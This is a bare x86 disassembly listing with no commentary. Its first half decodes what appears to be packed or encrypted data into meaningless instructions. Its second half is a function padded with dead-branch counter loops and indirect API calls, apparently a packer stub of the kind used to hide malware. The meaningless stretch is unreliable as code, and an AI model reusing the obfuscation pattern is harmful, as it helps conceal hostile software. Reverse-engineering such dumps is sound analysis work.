  405736:	sbb    eax,0xdef3b7b1
  40573b:	jp     0x40570e
  40573d:	push   es
  40573e:	push   ds
  40573f:	push   esp
  405740:	pmulhuw mm0,QWORD PTR [eax]
  405743:	xor    eax,eax
  405745:	dec    esi
  405746:	sysexit 
  405748:	jns    0x4057bc
  40574a:	aam    0x27
  40574c:	jnp    0x405761
  40574e:	mov    eax,ds:0x81344487
  405753:	add    ecx,esp
  405755:	jbe    0x405726
  405757:	adc    BYTE PTR [esi+ecx*4-0xb85cc97],dl
  40575e:	xchg   edi,eax
  40575f:	mov    eax,0x56ab75fb
  405765:	std    
  405766:	xchg   esp,eax
  405767:	ins    BYTE PTR es:[edi],dx
  405768:	call   0x4053:0x376e37ca
  40576f:	jge    0x4057cf
  405771:	xchg   ebx,eax
  405772:	mov    BYTE PTR ds:[ebx+0x52183aa2],al
  405779:	fidivr DWORD PTR [edx]
  40577b:	adc    BYTE PTR [edx+ebx*1+0x548e6dff],0x60
  405783:	xor    edx,DWORD PTR [eax]
  405785:	bound  ebp,QWORD PTR [ecx+0x35]
  405788:	mov    DWORD PTR [ebx-0x1],edi
  40578b:	clc    
  40578c:	mov    ch,0x52
  40578e:	imul   ebp,DWORD PTR [esi+ecx*1],0x2f225cde
  405795:	mov    bh,dh
  405797:	pop    es
  405798:	test   DWORD PTR [edi+ecx*2],eax
  40579b:	(bad)  
  40579c:	aas    
  40579d:	iret   
  40579e:	fistp  WORD PTR [edx-0xf]
  4057a1:	popa   
  4057a2:	sbb    dh,BYTE PTR [ebp-0x5b]
  4057a5:	jb     0x405784
  4057a7:	or     al,0x75
  4057a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057aa:	test   eax,0xc0894e37
  4057af:	add    BYTE PTR [esi+0x1d],cl
  4057b2:	hlt    
  4057b3:	repz inc edi
  4057b5:	adc    esp,DWORD PTR ds:0xd501a86d
  4057bb:	ficomp WORD PTR [eax+0x48]
  4057be:	fnstsw WORD PTR [edx+edx*8-0x21]
  4057c2:	or     ebp,esp
  4057c4:	(bad)  
  4057c5:	fistp  DWORD PTR [ebx-0x3f]
  4057c8:	out    0xf3,eax
  4057ca:	sbb    ebp,edx
  4057cc:	mov    al,0xe2
  4057ce:	or     al,0x2c
  4057d0:	cdq    
  4057d1:	imul   ecx,DWORD PTR [edx+0x5fa84de4],0x995bbfb8
  4057db:	or     edx,DWORD PTR [ebx+0x5]
  4057de:	retf   
  4057df:	fisub  DWORD PTR ds:[ebx]
  4057e2:	cli    
  4057e3:	out    dx,eax
  4057e4:	pushf  
  4057e5:	jnp    0x405841
  4057e7:	push   edi
  4057e8:	int    0x93
  4057ea:	ins    DWORD PTR es:[edi],dx
  4057eb:	adc    BYTE PTR ds:0xce0173ea,bl
  4057f1:	jb     0x40577e
  4057f3:	pop    edx
  4057f4:	and    ebp,ebx
  4057f6:	pusha  
  4057f7:	aas    
  4057f8:	dec    ebp
  4057f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057fa:	jne    0x40581d
  4057fc:	jns    0x4057fe
  4057fe:	lods   al,BYTE PTR ds:[esi]
  4057ff:	pop    ds
  405800:	sub    BYTE PTR [ebp-0x77269ff4],ch
  405806:	mov    ebx,0xb2d3dd83
  40580b:	adc    BYTE PTR [ecx-0x1],ch
  40580e:	inc    ebx
  40580f:	jns    0x4057dd
  405811:	or     BYTE PTR [eax-0x50],cl
  405814:	mov    ebp,0xf92bb6bd
  405819:	data16 ja 0x405801
  40581c:	cmc    
  40581d:	out    dx,al
  40581e:	fld    DWORD PTR [edi+0x38]
  405821:	jge    0x4057fe
  405823:	add    ebp,DWORD PTR [ebp-0x49f1de68]
  405829:	dec    ecx
  40582a:	adc    eax,0x31bc7d3c
  40582f:	adc    ch,bl
  405831:	fld    DWORD PTR [edx]
  405833:	test   eax,0x56fbcb14
  405838:	and    al,0xe9
  40583a:	mov    dh,0x95
  40583c:	mov    ebx,0xbe7416a9
  405841:	mov    es,WORD PTR [edi]
  405843:	pusha  
  405844:	xor    BYTE PTR [edx+0x7b425d13],dl
  40584a:	and    edi,DWORD PTR [edi-0x8c1e0f]
  405850:	adc    DWORD PTR [ebp-0x67],0x13ba2760
  405857:	fs ficomp WORD PTR ss:[esi]
  40585b:	fld    TBYTE PTR [edx-0x3]
  40585e:	sbb    al,0x89
  405860:	mov    ds:0x6d034c0a,eax
  405865:	pop    ss
  405866:	xor    eax,0x89175015
  40586b:	jecxz  0x40585d
  40586d:	cdq    
  40586e:	jno    0x405825
  405870:	add    BYTE PTR [eax-0x7e6bc90c],dl
  405876:	jns    0x40582b
  405878:	cdq    
  405879:	mov    esi,esp
  40587b:	adc    DWORD PTR ds:0x8e210e72,edx
  405881:	in     al,0x3
  405883:	jae    0x4058e6
  405885:	fistp  DWORD PTR [esi]
  405887:	jl     0x4058a4
  405889:	push   ebp
  40588a:	popf   
  40588b:	cmc    
  40588c:	jns    0x40583a
  40588e:	lahf   
  40588f:	dec    esp
  405890:	outs   dx,BYTE PTR ds:[esi]
  405891:	aam    0x6e
  405893:	test   DWORD PTR [edx-0x15f8241f],eax
  405899:	pusha  
  40589a:	shl    bl,cl
  40589c:	in     eax,0xd4
  40589e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40589f:	xchg   BYTE PTR ds:[edx],dl
  4058a2:	or     eax,0x24b0aeab
  4058a7:	fcmovnbe st,st(4)
  4058a9:	mov    dh,0x47
  4058ab:	inc    esp
  4058ac:	fiadd  WORD PTR [esi]
  4058ae:	daa    
  4058af:	leave  
  4058b0:	icebp  
  4058b1:	mov    edx,DWORD PTR [esi]
  4058b3:	xor    esi,esi
  4058b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058b6:	scas   al,BYTE PTR es:[edi]
  4058b7:	or     al,0x47
  4058b9:	xor    al,0x94
  4058bb:	sbb    eax,0xcb08826c
  4058c0:	aam    0xc4
  4058c2:	and    DWORD PTR [esi],edi
  4058c4:	shr    BYTE PTR [ebx],0xb1
  4058c7:	stos   BYTE PTR es:[edi],al
  4058c8:	push   edi
  4058c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058cb:	pop    ecx
  4058cc:	mov    esi,0x2e40ead7
  4058d1:	sub    ecx,DWORD PTR [esi-0x52]
  4058d4:	pop    ss
  4058d5:	fstp   QWORD PTR [edx+0x7347c818]
  4058db:	cmc    
  4058dc:	dec    eax
  4058dd:	lods   al,BYTE PTR ds:[esi]
  4058de:	pop    edi
  4058df:	mov    dl,0x48
  4058e1:	jle    0x4058d5
  4058e3:	ret    
  4058e4:	ja     0x4058d3
  4058e6:	sub    al,0x82
  4058e8:	sbb    ecx,eax
  4058ea:	mov    cl,0xb
  4058ec:	or     dh,BYTE PTR [ebx]
  4058ee:	push   0xffffffc8
  4058f0:	scas   eax,DWORD PTR es:[edi]
  4058f1:	sbb    dl,BYTE PTR [ebx-0x5cfafa75]
  4058f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058f8:	or     BYTE PTR [esi+eiz*8-0x4a3316],0x92
  405900:	loop   0x40597c
  405902:	leave  
  405903:	sbb    al,0x68
  405905:	sbb    al,0x72
  405907:	out    dx,al
  405908:	xchg   edi,eax
  405909:	(bad)  [edx]
  40590b:	sub    DWORD PTR [ecx+0x71],0xca48e644
  405912:	adc    eax,0x2db9de96
  405917:	mov    ch,0x93
  405919:	fsubrp st(5),st
  40591b:	or     ah,BYTE PTR [esi]
  40591d:	out    dx,al
  40591e:	cmp    al,0x25
  405920:	adc    esi,ebx
  405922:	mov    al,0x88
  405924:	xchg   ebp,eax
  405925:	outs   dx,DWORD PTR ds:[esi]
  405926:	cmp    ch,BYTE PTR ds:0xfd0a3b3e
  40592c:	ins    DWORD PTR es:[edi],dx
  40592d:	fistp  DWORD PTR [ecx]
  40592f:	dec    ecx
  405930:	mov    al,ds:0x2c8e448
  405935:	jae    0x4058f4
  405937:	imul   edi,DWORD PTR [eax-0x21],0x931a909e
  40593e:	js     0x40596f
  405940:	cmp    bl,bl
  405942:	(bad)  
  405943:	mov    ds:0xc30043a,eax
  405948:	mov    edi,0x36b182be
  40594d:	ds cdq 
  40594f:	xor    DWORD PTR [edx+0x615f6021],edx
  405955:	mov    ebx,0xf52005b4
  40595a:	adc    eax,0x7899d26e
  40595f:	mov    edx,0xe157a367
  405964:	repnz neg dh
  405967:	mov    dh,0xc4
  405969:	pop    edi
  40596a:	pop    ds
  40596b:	mov    ah,0x63
  40596d:	or     DWORD PTR [edx+0x2d],ebx
  405970:	cli    
  405971:	jnp    0x405917
  405973:	icebp  
  405974:	in     eax,0x3
  405976:	pushf  
  405977:	jno    0x405935
  405979:	xor    edi,ecx
  40597b:	shl    BYTE PTR [esp+esi*1-0x58],0x37
  405980:	jno    0x405904
  405982:	in     al,0xd2
  405984:	mov    BYTE PTR [ecx-0x1ed57605],al
  40598a:	lahf   
  40598b:	push   esp
  40598c:	and    ch,ch
  40598e:	mov    ds:0x93b97123,eax
  405993:	mov    ch,0x27
  405995:	push   es
  405996:	inc    ecx
  405997:	fwait
  405998:	rcl    BYTE PTR [eax],1
  40599a:	pop    es
  40599b:	mov    WORD PTR [esi+0x7ae1c0be],gs
  4059a1:	pop    esi
  4059a2:	out    dx,al
  4059a3:	in     al,0x14
  4059a5:	xor    BYTE PTR [ebp-0x6dda0ff0],cl
  4059ab:	or     DWORD PTR [edi+0xa],edx
  4059ae:	add    ecx,DWORD PTR [ebp+0x47]
  4059b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059b2:	cld    
  4059b3:	jle    0x405a04
  4059b5:	pop    eax
  4059b6:	cmp    ecx,eax
  4059b8:	mov    eax,0xd1237156
  4059bd:	hlt    
  4059be:	cwde   
  4059bf:	not    al
  4059c1:	and    DWORD PTR [ecx],ecx
  4059c3:	gs cmc 
  4059c5:	adc    al,0x45
  4059c7:	test   BYTE PTR [ecx],cl
  4059c9:	jmp    0x7ba2:0xef7083d8
  4059d0:	sub    al,0x4
  4059d2:	mov    ecx,0xc292f12d
  4059d7:	pusha  
  4059d8:	xchg   edi,eax
  4059d9:	mov    bl,0x78
  4059db:	sbb    DWORD PTR [eax+0x9],ecx
  4059de:	(bad)  
  4059df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059e0:	add    ebx,DWORD PTR [edx]
  4059e2:	xor    dh,0x20
  4059e5:	push   eax
  4059e6:	scas   al,BYTE PTR es:[edi]
  4059e7:	mov    edx,0x9deb407c
  4059ec:	mov    dl,0xe
  4059ee:	adc    ebx,eax
  4059f0:	fst    st(0)
  4059f2:	push   ss
  4059f3:	mov    ah,0x61
  4059f5:	inc    esp
  4059f6:	out    0xae,al
  4059f8:	mov    ebp,edx
  4059fa:	xchg   esp,eax
  4059fb:	add    ch,BYTE PTR [ecx-0x7b2117c5]
  405a01:	scas   eax,DWORD PTR es:[edi]
  405a02:	stos   DWORD PTR es:[edi],eax
  405a03:	jnp    0x405a62
  405a05:	js     0x4059a8
  405a07:	(bad)  
  405a08:	stos   DWORD PTR es:[edi],eax
  405a09:	sbb    edi,DWORD PTR [ebp+0x47]
  405a0c:	pusha  
  405a0d:	into   
  405a0e:	dec    esi
  405a0f:	sbb    BYTE PTR ds:0x3666ff56,0xa7
  405a16:	mov    eax,ds:0x52f7e0ce
  405a1b:	jge    0x405a21
  405a1d:	jle    0x405a47
  405a1f:	sahf   
  405a20:	bound  esi,QWORD PTR [eax]
  405a22:	sbb    DWORD PTR [esi],esp
  405a24:	mov    ebp,0xb122ec71
  405a29:	ja     0x405a9d
  405a2b:	pop    esi
  405a2c:	fdivr  st,st(4)
  405a2e:	mov    ch,0x44
  405a30:	call   0x7ba:0x3fd75c27
  405a37:	jne    0x405a14
  405a39:	mov    WORD PTR gs:[esi+0x178abc3c],gs
  405a40:	push   esp
  405a41:	mov    bh,BYTE PTR [esi-0x559786f5]
  405a47:	fidiv  DWORD PTR [eax+0x74]
  405a4a:	ret    
  405a4b:	out    0x4c,al
  405a4d:	les    edx,FWORD PTR [ebx+0x6c2aa083]
  405a53:	icebp  
  405a54:	lods   eax,DWORD PTR ds:[esi]
  405a55:	out    0x5,al
  405a57:	fisubr DWORD PTR [ecx]
  405a59:	repnz and DWORD PTR [esi+0x263f9177],esi
  405a60:	add    DWORD PTR [edx+eax*8],ecx
  405a63:	push   0xffffff8d
  405a65:	xor    bh,0xb2
  405a68:	sbb    eax,0x4c61d992
  405a6d:	sbb    al,0x2
  405a6f:	outs   dx,DWORD PTR ds:[esi]
  405a70:	pop    ds
  405a71:	fsubp  st(1),st
  405a73:	xor    DWORD PTR [edx+0x7b],edi
  405a76:	add    BYTE PTR [edi+eax*1+0x36],bh
  405a7a:	pop    ecx
  405a7b:	dec    ebp
  405a7c:	and    eax,esp
  405a7e:	inc    eax
  405a7f:	nop
  405a80:	lea    ebx,[ebp+0x4]
  405a83:	inc    esi
  405a84:	dec    edi
  405a85:	cmp    edi,esi
  405a87:	pushf  
  405a88:	sti    
  405a89:	push   cs
  405a8a:	push   ds
  405a8b:	mov    eax,ds:0x9d662433
  405a90:	lahf   
  405a91:	popf   
  405a92:	ins    DWORD PTR es:[edi],dx
  405a93:	push   ecx
  405a94:	push   cs
  405a95:	dec    esi
  405a96:	pop    ss
  405a97:	ret    0x1f34
  405a9a:	mov    ds:0xbac3e423,eax
  405a9f:	in     eax,dx
  405aa0:	out    dx,eax
  405aa1:	pop    esi
  405aa2:	adc    BYTE PTR [edi+0x1ccdaa6],0x28
  405aa9:	mov    ah,0xed
  405aab:	mov    dl,BYTE PTR [esi+0x3f]
  405aae:	pop    ebp
  405aaf:	pop    esi
  405ab0:	lea    ecx,[edi+0x66]
  405ab3:	bound  edi,QWORD PTR [ebp+ecx*4-0x6d]
  405ab7:	adc    ah,BYTE PTR ds:0xca897901
  405abd:	sub    ebx,ecx
  405abf:	push   0x65
  405ac1:	ins    BYTE PTR es:[edi],dx
  405ac2:	(bad)  
  405ac4:	xor    ebp,DWORD PTR [eax-0x8afdc34]
  405aca:	fstp   DWORD PTR [bx+0x178]
  405acf:	ds inc edx
  405ad1:	jecxz  0x405b4b
  405ad3:	addr16 out 0x40,al
  405ad6:	adc    cl,BYTE PTR [esi-0x63]
  405ad9:	mov    ah,0x5a
  405adb:	pop    eax
  405adc:	sar    DWORD PTR [ebp+ebx*2-0x2a],0xd4
  405ae1:	cmp    DWORD PTR [esi],ebx
  405ae3:	out    dx,eax
  405ae4:	mov    ds:0x356c539,al
  405ae9:	fs inc esi
  405aeb:	mov    DWORD PTR ds:0xede3f458,0x824bbcb6
  405af5:	shr    BYTE PTR [eax+0x323e5a7a],cl
  405afb:	or     eax,0x31d379d4
  405b00:	inc    edx
  405b01:	(bad)  
  405b02:	fild   WORD PTR [edi+0x7]
  405b05:	push   0x381eb5a8
  405b0a:	cmp    al,0x9c
  405b0c:	stos   BYTE PTR es:[edi],al
  405b0d:	test   eax,0xe5788a2f
  405b12:	inc    eax
  405b13:	push   esi
  405b14:	enter  0x3a5a,0x36
  405b18:	in     eax,dx
  405b19:	jmp    0x405ad1
  405b1b:	js     0x405ad1
  405b1d:	sar    BYTE PTR [ebp+0x3d],0x85
  405b21:	mov    al,0xee
  405b23:	mov    ch,0x7
  405b25:	pushf  
  405b26:	jns    0x405ac5
  405b28:	aad    0x83
  405b2a:	xchg   ebp,eax
  405b2b:	pop    ds
  405b2c:	loop   0x405b42
  405b2e:	gs test al,0xec
  405b31:	jno    0x405b9a
  405b33:	adc    esp,DWORD PTR [edi+0x4bbc3ee3]
  405b39:	retf   
  405b3a:	es std 
  405b3c:	aaa    
  405b3d:	sub    dl,dh
  405b3f:	push   ecx
  405b40:	sbb    eax,0xa1a561f9
  405b45:	or     eax,0x98d62766
  405b4a:	aaa    
  405b4b:	lds    edi,FWORD PTR [edi]
  405b4d:	and    BYTE PTR [esi-0x23ca8bb3],bh
  405b53:	lods   al,BYTE PTR ds:[esi]
  405b54:	mov    ecx,ebp
  405b56:	lods   eax,DWORD PTR ds:[esi]
  405b57:	mov    ds:0x1011dec8,eax
  405b5c:	push   0xadf53856
  405b61:	es xchg edx,eax
  405b63:	mov    ebx,0xcd6fbe36
  405b68:	test   BYTE PTR [eax],al
  405b6a:	fs jns 0x405be9
  405b6d:	(bad)  
  405b6e:	loopne 0x405b5a
  405b70:	test   BYTE PTR [ebx-0x6771831],0xc8
  405b77:	lods   al,BYTE PTR ds:[esi]
  405b78:	test   DWORD PTR [esi],ebx
  405b7a:	cmp    al,0x44
  405b7c:	mov    BYTE PTR [ebp+0x73],bl
  405b7f:	iret   
  405b80:	add    BYTE PTR [esi-0x38a1bb40],bl
  405b86:	out    dx,eax
  405b87:	imul   ecx,DWORD PTR [ebx+0x36],0xe6abbe2b
  405b8e:	push   cs
  405b8f:	inc    edx
  405b90:	inc    eax
  405b91:	and    al,0xd9
  405b93:	ds leave 
  405b95:	test   BYTE PTR [eax],bh
  405b97:	popw   ss
  405b99:	cmp    eax,edx
  405b9b:	push   ds
  405b9c:	inc    edx
  405b9d:	test   DWORD PTR [eax],esi
  405b9f:	pusha  
  405ba0:	push   0x50c3c9d8
  405ba5:	and    DWORD PTR [esi],edi
  405ba7:	stos   DWORD PTR es:[edi],eax
  405ba8:	jmp    0x93a3c7b8
  405bad:	cmp    al,0xc8
  405baf:	dec    edx
  405bb0:	mov    edi,0x2033af88
  405bb5:	jl     0x405b98
  405bb7:	or     al,0xec
  405bb9:	push   eax
  405bba:	nop
  405bbb:	xchg   ebp,eax
  405bbc:	or     eax,0xdc4317c5
  405bc1:	cmp    esi,ebx
  405bc3:	test   DWORD PTR [esi+0x3661bf7c],0xebf43a2d
  405bcd:	inc    ebx
  405bce:	xchg   ebp,eax
  405bcf:	(bad)  
  405bd0:	stc    
  405bd1:	or     dl,BYTE PTR [ecx+0x281f9621]
  405bd7:	test   DWORD PTR [ebp+edi*2+0x78b5f12c],ebx
  405bde:	in     al,0x21
  405be0:	xchg   esp,eax
  405be1:	push   0xf8517a57
  405be6:	mov    edx,0xb971843c
  405beb:	mov    ecx,0x6e4d591f
  405bf0:	adc    al,0xd3
  405bf2:	outs   dx,DWORD PTR ds:[esi]
  405bf3:	add    cl,al
  405bf5:	mov    ds:0xce5f2f3f,al
  405bfa:	outs   dx,BYTE PTR ds:[esi]
  405bfb:	inc    ebx
  405bfc:	retf   0x5b29
  405bff:	outs   dx,DWORD PTR ds:[esi]
  405c00:	rcl    BYTE PTR [ebx],0x72
  405c03:	ss pop ds
  405c05:	xchg   DWORD PTR [eax+edi*2+0xfd7c3f9],ebx
  405c0c:	xchg   esi,eax
  405c0d:	mov    al,ds:0xd25f153e
  405c12:	popf   
  405c13:	pop    edi
  405c14:	sbb    DWORD PTR [edi],esp
  405c16:	pop    edi
  405c17:	xor    ah,BYTE PTR [esi+0x4732d3b2]
  405c1d:	xor    cl,BYTE PTR [edx+0x2ea3df91]
  405c23:	lods   eax,DWORD PTR ds:[esi]
  405c24:	inc    ebx
  405c25:	aas    
  405c26:	pop    eax
  405c27:	inc    edx
  405c28:	cmp    DWORD PTR [ebx+0x56],0xffffff91
  405c2c:	xchg   ebx,ebx
  405c2e:	add    BYTE PTR [ebp-0x2c],bl
  405c31:	dec    ebp
  405c32:	mov    eax,ds:0xa887f04
  405c37:	mov    ds:0xc5b45b86,al
  405c3c:	aam    0xb9
  405c3e:	add    al,0x86
  405c40:	push   edx
  405c41:	cmp    al,0xa7
  405c43:	push   es
  405c44:	cwde   
  405c45:	aaa    
  405c46:	push   ds
  405c47:	test   al,0x2c
  405c49:	adc    esp,DWORD PTR [ecx+0x421ae2]
  405c4f:	push   DWORD PTR [eax]
  405c51:	push   DWORD PTR ds:0x421d3e
  405c57:	push   DWORD PTR ds:0x421aea
  405c5d:	push   DWORD PTR ds:0x421d1e
  405c63:	push   DWORD PTR ds:0x421db2
  405c69:	push   DWORD PTR [ebp-0x30]
  405c6c:	push   DWORD PTR [ebp-0x20]
  405c6f:	mov    eax,DWORD PTR [ebp-0x8]
  405c72:	mov    eax,DWORD PTR [eax]
  405c74:	mov    eax,DWORD PTR [eax]
  405c76:	mov    eax,DWORD PTR [eax]
  405c78:	call   eax
  405c7a:	mov    eax,DWORD PTR [ebp-0x34]
  405c7d:	mov    ecx,DWORD PTR ds:0x421ce2
  405c83:	add    DWORD PTR [eax],ecx
  405c85:	pop    edi
  405c86:	pop    esi
  405c87:	leave  
  405c88:	ret    
  405c89:	push   ebp
  405c8a:	mov    ebp,esp
  405c8c:	sub    esp,0x58
  405c8f:	add    DWORD PTR ds:0x429008,0x42b004
  405c99:	push   ebx
  405c9a:	adc    DWORD PTR ds:0x42a018,0x429010
  405ca4:	push   esi
  405ca5:	push   edi
  405ca6:	and    DWORD PTR ds:0x42c00c,0x6433
  405cb0:	push   0x1f
  405cb2:	lea    eax,[ebp-0x58]
  405cb5:	push   eax
  405cb6:	adc    DWORD PTR ds:0x42a010,0x6fdc
  405cc0:	push   0x0
  405cc2:	sub    DWORD PTR ds:0x42b018,0x7ba7
  405ccc:	call   DWORD PTR ds:0x424034
  405cd2:	call   DWORD PTR ds:0x424004
  405cd8:	and    DWORD PTR ds:0x42a000,0x4473
  405ce2:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  405ce9:	and    DWORD PTR ds:0x429018,0x0
  405cf3:	mov    ebx,DWORD PTR ds:0x429018
  405cf9:	inc    ebx
  405cfa:	mov    DWORD PTR ds:0x429018,ebx
  405d00:	cmp    DWORD PTR ds:0x429018,0x1f
  405d07:	jne    0x405d1d
  405d0d:	push   0x42b00c
  405d12:	push   0x7f05
  405d17:	call   DWORD PTR ds:0x42403c
  405d1d:	cmp    DWORD PTR ds:0x429018,0x19
  405d24:	jb     0x405cf3
  405d2a:	add    ebx,DWORD PTR ds:0x42a008
  405d30:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  405d37:	mov    ecx,DWORD PTR [ebp-0x4]
  405d3a:	mov    ebx,0x7510893
  405d3f:	xor    ecx,ebx
  405d41:	or     DWORD PTR ds:0x42b00c,edx
  405d47:	mov    eax,0x3272db
  405d4c:	add    ecx,eax
  405d4e:	sub    DWORD PTR ds:0x42a010,0x429004
  405d58:	mov    DWORD PTR [ebp-0x1c],ecx
  405d5b:	mov    ecx,DWORD PTR [ebp+0x14]
  405d5e:	mov    DWORD PTR ds:0x42800c,0x25aa
  405d68:	test   ecx,ecx
  405d6a:	mov    DWORD PTR ds:0x428000,0x5e1a
  405d74:	je     0x405d92
  405d7a:	sub    DWORD PTR ds:0x42b018,0x6b15
  405d84:	mov    ecx,DWORD PTR [ebp+0x14]
  405d87:	mov    ecx,DWORD PTR [ecx]
  405d89:	add    DWORD PTR ds:0x42a000,ecx
  405d8f:	mov    DWORD PTR [ebp-0x1c],ecx
  405d92:	and    DWORD PTR ds:0x42a010,0x0
  405d9c:	mov    edi,DWORD PTR ds:0x42a010
  405da2:	inc    edi
  405da3:	mov    DWORD PTR ds:0x42a010,edi
  405da9:	cmp    DWORD PTR ds:0x42a010,0x9
  405db0:	jne    0x405dc4
  405db6:	push   DWORD PTR [ebp-0x14]
  405db9:	push   0x423847
  405dbe:	call   DWORD PTR ds:0x424040
  405dc4:	cmp    DWORD PTR ds:0x42a010,0x8
  405dcb:	jne    0x405dde
  405dd1:	mov    edi,DWORD PTR ds:0x42a010
  405dd7:	inc    edi
  405dd8:	mov    DWORD PTR ds:0x42a010,edi
  405dde:	cmp    DWORD PTR ds:0x42a010,0x13
  405de5:	jb     0x405d9c
  405deb:	mov    ecx,0x457a
  405df0:	imul   edx,eax
  405df3:	mov    esi,0x787f
  405df8:	or     DWORD PTR ds:0x428004,0x4238
  405e02:	add    edx,ecx
  405e04:	sbb    DWORD PTR ds:0x429014,0x4641
  405e0e:	xchg   esi,ecx
  405e10:	xor    DWORD PTR ds:0x42801c,edi
  405e16:	mov    edi,0x155c
  405e1b:	sub    edx,edi
  405e1d:	and    DWORD PTR ds:0x42901c,0x60c1
  405e27:	mov    ecx,DWORD PTR [ebp-0x4]
  405e2a:	xor    ecx,ebx
  405e2c:	and    DWORD PTR ds:0x42b014,0x0
  405e36:	mov    esi,DWORD PTR ds:0x42b014
  405e3c:	inc    esi
  405e3d:	mov    DWORD PTR ds:0x42b014,esi
  405e43:	cmp    DWORD PTR ds:0x42b014,0x10
  405e4a:	jne    0x405e5b
  405e50:	push   0x423806
  405e55:	call   DWORD PTR ds:0x424044
  405e5b:	cmp    DWORD PTR ds:0x42b014,0xf
  405e62:	jne    0x405e75
  405e68:	mov    esi,DWORD PTR ds:0x42b014
  405e6e:	inc    esi
  405e6f:	mov    DWORD PTR ds:0x42b014,esi
  405e75:	cmp    DWORD PTR ds:0x42b014,0x1b
  405e7c:	jb     0x405e36
  405e82:	add    ecx,eax
  405e84:	sbb    esi,0x766b
  405e8a:	mov    DWORD PTR [ebp-0x8],ecx
  405e8d:	and    esi,0x21f
  405e93:	mov    ecx,DWORD PTR [ebp-0x14]
  405e96:	mov    DWORD PTR ds:0x42b000,0x19
  405ea0:	cmp    DWORD PTR ds:0x42b000,0x0
  405ea7:	je     0x405f01
  405ead:	cmp    DWORD PTR ds:0x42b000,0x4
  405eb4:	jne    0x405ecd
  405eba:	push   DWORD PTR [ebp-0x1c]
  405ebd:	push   0x429018
  405ec2:	push   0x423a72
  405ec7:	call   DWORD PTR ds:0x424048
  405ecd:	cmp    DWORD PTR ds:0x42b000,0x5
  405ed4:	jne    0x405ee7
  405eda:	mov    esi,DWORD PTR ds:0x42b000
  405ee0:	dec    esi
  405ee1:	mov    DWORD PTR ds:0x42b000,esi
  405ee7:	xor    esi,esi
  405ee9:	add    esi,DWORD PTR ds:0x42b000
  405eef:	dec    esi
  405ef0:	mov    DWORD PTR ds:0x42b000,esi
  405ef6:	jmp    0x405ea0
  405efb:	and    esi,0x686c
  405f01:	xor    ecx,ebx
  405f03:	add    ecx,eax
  405f05:	mov    DWORD PTR [ebp-0x24],ecx
  405f08:	adc    esi,ecx
  405f0a:	mov    ecx,DWORD PTR [ebp-0x4]
  405f0d:	and    DWORD PTR ds:0x428014,0x0
  405f17:	jmp    0x405f29
  405f1c:	mov    esi,DWORD PTR ds:0x428014
  405f22:	inc    esi
  405f23:	mov    DWORD PTR ds:0x428014,esi
  405f29:	cmp    DWORD PTR ds:0x428014,0x14
  405f30:	jae    0x405f5c
  405f36:	cmp    DWORD PTR ds:0x428014,0x1d
  405f3d:	jne    0x405f51
  405f43:	push   0x42b01c
  405f48:	push   DWORD PTR [ebp-0xc]
  405f4b:	call   DWORD PTR ds:0x424014
  405f51:	jmp    0x405f1c
  405f56:	xor    DWORD PTR ds:0x428018,ecx
  405f5c:	xor    ecx,ebx
  405f5e:	add    ecx,eax
  405f60:	add    DWORD PTR ds:0x428004,edx
  405f66:	mov    DWORD PTR [ebp-0x30],ecx
  405f69:	adc    DWORD PTR ds:0x42b01c,edi
  405f6f:	mov    esi,DWORD PTR [ebp-0x4]
  405f72:	xor    DWORD PTR ds:0x42800c,0x2f0f
  405f7c:	xor    esi,ebx
  405f7e:	and    DWORD PTR ds:0x429018,0x0
  405f88:	mov    ecx,DWORD PTR ds:0x429018
  405f8e:	inc    ecx
  405f8f:	mov    DWORD PTR ds:0x429018,ecx
  405f95:	cmp    DWORD PTR ds:0x429018,0x13
  405f9c:	jne    0x405fca
  405fa2:	push   DWORD PTR [ebp-0x18]
  405fa5:	push   0x42b018
  405faa:	push   0x8bc1
  405faf:	push   0x42a018
  405fb4:	push   0x81c2
  405fb9:	push   DWORD PTR [ebp-0x18]
  405fbc:	push   0x8630
  405fc1:	push   DWORD PTR [ebp-0x28]
  405fc4:	call   DWORD PTR ds:0x424018
  405fca:	cmp    DWORD PTR ds:0x429018,0x10
  405fd1:	jb     0x405f88
  405fd7:	movzx  ecx,WORD PTR ds:0x429008
  405fde:	sub    ecx,DWORD PTR ds:0x42a010
  405fe4:	mov    DWORD PTR ds:0x429008,ecx
  405fea:	add    esi,eax
  405fec:	mov    ecx,DWORD PTR [ebp-0x24]
  405fef:	sub    ecx,eax
  405ff1:	lea    edx,[esi-0x3272db]
  405ff7:	xor    DWORD PTR ds:0x428008,0x428000
  406001:	xor    ecx,ebx
  406003:	sub    DWORD PTR ds:0x42c01c,0x42b01c
  40600d:	xor    edx,ebx
  40600f:	cmp    edx,ecx
  406011:	mov    DWORD PTR ds:0x428000,0x76f
  40601b:	je     0x4062a3
  406021:	xor    DWORD PTR ds:0x42c010,edx
  406027:	mov    ecx,DWORD PTR [ebp-0x4]
  40602a:	xor    ecx,ebx
  40602c:	or     DWORD PTR ds:0x429014,0x42a01c
  406036:	add    ecx,eax
  406038:	cmp    esi,ecx
  40603a:	mov    DWORD PTR ds:0x42a01c,0x739d
  406044:	jne    0x406280
  40604a:	add    DWORD PTR ds:0x42a00c,0x429004
  406054:	push   DWORD PTR [ebp+0x8]
  406057:	call   0x413c14
  40605c:	mov    DWORD PTR [ebp-0x18],eax
  40605f:	mov    eax,DWORD PTR [ebp-0x4]
  406062:	mov    DWORD PTR ds:0x42c00c,0x1d
  40606c:	cmp    DWORD PTR ds:0x42c00c,0x0
  406073:	je     0x4060a7
  406079:	cmp    DWORD PTR ds:0x42c00c,0x21
  406080:	jne    0x40608f
  406086:	push   DWORD PTR [ebp-0xc]
  406089:	call   DWORD PTR ds:0x42401c
  40608f:	mov    edi,DWORD PTR ds:0x42c00c
  406095:	dec    edi
  406096:	mov    DWORD PTR ds:0x42c00c,edi
  40609c:	jmp    0x40606c
  4060a1:	adc    ecx,DWORD PTR ds:0x428008
